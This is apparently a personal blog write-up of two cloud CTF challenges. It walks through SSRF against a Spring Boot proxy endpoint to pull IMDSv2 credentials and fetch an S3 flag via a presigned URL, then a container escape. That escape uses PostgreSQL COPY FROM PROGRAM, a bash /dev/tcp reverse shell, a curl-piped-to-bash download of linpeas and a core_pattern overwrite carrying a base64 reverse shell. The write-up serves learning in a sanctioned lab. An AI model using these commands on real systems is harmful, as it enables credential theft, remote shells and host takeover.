---
layout: post
title:  cloud security championship ctf writeup
tags: [ctf,security]
---

cloud security championship ctf writeup.

# Perimeter Leak
[challenge 1](https://www.cloudsecuritychampionship.com/challenge/1)
First, I didn't get what the author wants to test.

The title is Perimeter Leak and the author said AWS data perimeters. So I try to search for AWS data perimeters. And it's some kind of policys.

Then I say the web app is Spring Boot Actuator. So I try to leak something with the [endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html).

After I tried `env`,`metrics` and some more, I only get the bucket name.
```
curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env

"BUCKET":{"value":"challenge01-470f711"
```

Then I try to use `s3` to  access the bucket. I got `aws login`. Well, I don't have the credentials.

So I'm stuck. And I used the hint 1.
```
Spring Boot Actuator applications may be misconfigured to allow access to /actuator/mappings
```
Well. It's another endpoint. It's in the previous endpoints which I didn't try.

We can see a 'proxy' endpoint and `url` parameter. And we know that, it's SSRF.

I tried to use the [aws ssrf skills](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/). But I can't get the credentials.

Stuck again. Then I tried hint 2. 
```
The endpoint /proxy can be used to obtain IMDSv2 credentials
```

Then I asked DeepSeek about IMDSv2. It's used to prevent the SSRF from access IMDS.

As I don't have much experience about IMDSv2. I also tried to search IMDSv2. There is an article about how to exploit the [IMDSv2 with ssrf](https://medium.com/@harshagv/uncovering-cloud-security-flaws-how-ssrf-exploits-imdsv2-limitations-in-aws-75bd4201786b).

First, we need a PUT request to get the token.

```
curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token"

```

Then we try to get the credentials with the token.

```

curl -H "X-aws-ec2-metadata-token: YOURTOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"


curl -H "X-aws-ec2-metadata-token: YOURTOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"

{
  "Code" : "Success",
  "LastUpdated" : "2026-05-09T01:56:11Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASKEY",
  "SecretAccessKey" : "SCKEY",
  "Token" : "IQoJbTOKEN5qk=",
  "Expiration" : "2026-05-09T08:11:48Z"
}

```

Then we try to use [security-credentials](https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/).


```

export AWS_ACCESS_KEY_ID=ASKEY
export AWS_SECRET_ACCESS_KEY=SCKEY
export AWS_SESSION_TOKEN=IQoJbTOKEN5qk=
```

We can use this command to check.
`aws sts get-caller-identity`

Then we try to access the s3 bucket. We get the bucket name from the `env` endpoint.

```
aws s3 ls s3://challenge01-470f711

aws s3 cp s3://challenge01-470f711/hello.txt hello.txt
```

We can get the hello file. But when we try flag, we get 403.
```

aws s3 cp s3://challenge01-470f711/private/flag.txt .

fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The medium article told us to check policy.
```
aws s3api get-bucket-policy --bucket challenge01-470f711
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470f711/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
}
```
We asked DeepSeek about the policy. It says you need to access from the vpc `vpce-0dfd8b6aa1642a057`. And It also told us that you can use presign to sign the file.
```
# 生成一个默认有效期为1小时的预签名URL
aws s3 presign s3://challenge01-470f711/private/your-private-file.txt
```
Then we tried to sign the flag file. And we still need to access the url with the proxy. So you need to urlencode the url.

```
curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=https%3A%2F%2Fchallenge01-470f711.s3.amazonaws.com%2Fprivate%2Fflag.txt%3FX-Amz-Algorithm%3D..."
```
Bingo. The flag shows.

It's a traditional SSRF technique. But it's using the IMDSv2. So we need a SSRF which access PUT method and also custom headers. Then we can get the credentials. The interesting part is data perimeters policy. We can use presigned URLs with the ssrf endpoint. 


# Contain Me If You Can
This one is difficult. 

I tried to get some infomations about the system.
`ls -la /`

`cat /proc/mounts | xargs -d ',' -n 1 | grep workdir`
```
workdir=/var/lib/docker/overlay2/69bdc276831c13a1fe558b37e77167b3bff27487f7425ee46f82444e1ae070f2/work 0 0
```
Didn't get much info. So I asked for a hint.
Hint 1
```
Can you spot any interesting established network connections?
```
Then I try to get some network information.

```
netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 b7f6fbdc0560:45578      postgres_db.:postgresql ESTABLISHED
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path

netstat -tunapl
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:42547        0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.19.0.3:45578        172.19.0.2:5432         ESTABLISHED -                   
udp        0      0 127.0.0.11:49887        0.0.0.0:*                           -      

```
Well, I see a `postgres_db`.
Then I try to connect to the db directly. I tried blank password and the default password and some simple password. And I can't login.
Then I try to dump the traffic. I can see a `select` command. At first sight, I thought it's network tampering and network replay. Try to change the sql command with some evil command and resent. Then I try to find some existing tools. Seems it's a dead end. I also find that there are some ctfer who also tried this way and failed.
```
psql -h 172.19.0.2

tcpdump -A -i any -s 0 host 172.19.0.2 and port 5432

```
So, we need more hint. Hint 2
```
This network connection is plain-text. Can you think of a way to take advantage of it?
```
No new idea. We tried to capture the traffic.
More hint. Hint 3
```
`COPY ... FROM PROGRAM` can be used to execute arbitrary code in PostgreSQL.
```
So we can use this command to exec command. Question is how? Tamper the traffic?

Try to get some  help with search engine.

This [writeup](https://medium.com/@danielndias/challenge-2-contain-me-if-you-can-b0b47226c5eb) suggests that we can kill the connection. And when the connection reconnects, we can capture the credentials.
```
tcpkill -i any host 172.19.0.2 and port 5432
tcpdump -A -i any -s 0  host 172.19.0.2 and port 5432 
```
From  the dump, we can see a string `SecretPostgreSQLPassword`. Then I try to login with it, but I still can't login.
Then I give the dump to DeepSeek, it told me the username and databasename.

Then we log in to the database.
```

psql -h 172.19.0.2 -U user 

psql "host=172.19.0.2 port=5432 user=user dbname=mydatabase"
```
The psql shell is different from mysql shell. You need to use \ to start a command. So I asked DeepSeek to create some table and exec the copy command.

```
CREATE TABLE simple_table (
    content TEXT
);

\copy simple_table from program 'ls /'

select * from simple_table;


\copy simple_table from program 'cat /flag'

\copy simple_table from program 'id'
```
We didn't get the flag. We learned that we are still in a container later.

Get more hint.Hint 4
```
The PostgreSQL administrator of this environment needed a really easy and convenient way to become root for maintenance purposes.
```
Then I try to get database config to get some root password. And this not the right direction.
```

SHOW config_file;
               config_file                
------------------------------------------
 /var/lib/postgresql/data/postgresql.conf

\copy simple_table from program 'cat /var/lib/postgresql/data/postgresql.conf'

SHOW hba_file;
               hba_file               
--------------------------------------
 /var/lib/postgresql/data/pg_hba.conf

\copy simple_table from program 'cat /var/lib/postgresql/data/pg_hba.conf'
```


Get more hint from [writeup 2](https://tresscross.blog/contain-me-if-you-can-wiz-cloud-ctf-july/) and [writeup 3](https://manesec.github.io/2025/08/24/2025/61-WIZ-Contain-Me-If-You-Can/).

We need to get a reverse shell with the pg command. Then we need to do a docker escape. In the end we get the flag.

We need reverse shells and the writeup suggests we use `tmux`.
```
apt update
apt install tmux

tmux
ctrl+b, %
# ctrl+b, arrow key to switch 

ctrl+b "

# get ip
ifconfig | grep 172
172.19.0.3

# start a listener
nc -lvnp 7000


CREATE TABLE shell(t TEXT);
COPY shell FROM PROGRAM '/bin/bash -c "/bin/bash -i >& /dev/tcp/172.19.0.3/7000 0>&1"' ;
```

Now we get a reverse shell from the db.
```
032c93ff87db:~/data$ whoami
whoami
postgres
032c93ff87db:~/data$ id
id
uid=70(postgres) gid=70(postgres) groups=10(wheel),70(postgres)
032c93ff87db:~/data$ 
```
Writeup3 suggests we use `Linpeas` to check the container.
```
032c93ff87db:~/data$ sudo su
sudo su
whoami
root

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

chmod +x linpeas.sh
bash linpeas.sh

./linpeas.sh > output.txt
```
It's not easy to see the results with current tmux settings. You need to change the setting to see more.
So we just skip this part and go to the `/proc/sys/kernel/core_pattern` part.


First we tried this payload, but can't get a shell
```
echo '|/bin/bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjMvOTAwMCAwPiYx | base64 -d | /bin/bash"' > /proc/sys/kernel/core_pattern
sh -c 'kill -11 "$$"'

nc -lvnp 9000
```

Then we tried a payload from [wiz blog](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r). It works.
```
echo '|/bin/bash -c echo${IFS%%??}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOS4wLjMvOTAwMCAwPiYx|base64${IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern 

sh -c 'kill -11 "$$"' 
```

So what works here is that we try to write a command to the core_pattern. And then we sent to a crash command. When the system get the crash, it will exec the command we write in the core_pattern. Then we get a shell in the host machine.

Some more [techniques](https://juggernaut-sec.com/docker-breakout-lpe/).


```
# check the system
uname
Linux
cat /etc/issue
Welcome to Alpine Linux 3.21
Kernel \r on an \m (\l)

# install some package
sudo apk add curl
sudo apk add python3

# get a new tty
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z         #backgrounds netcat session
stty raw -echo
fg               #brings netcat session back to the foreground
export TERM=xterm


#wget https://github.com/cdk-team/CDK/releases/download/v1.5.6/cdk_linux_amd64


sudo -l
sudo su

cat /proc/mounts | grep 'proc'
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0

ls -l /proc/sys/kernel/core_pattern

```

It's a really hard one if you don't have ctf experience.
We learned that we can use `copy . from program` to exec command in pgsql and we can use `core_pattern` to privilege escalate to the host.







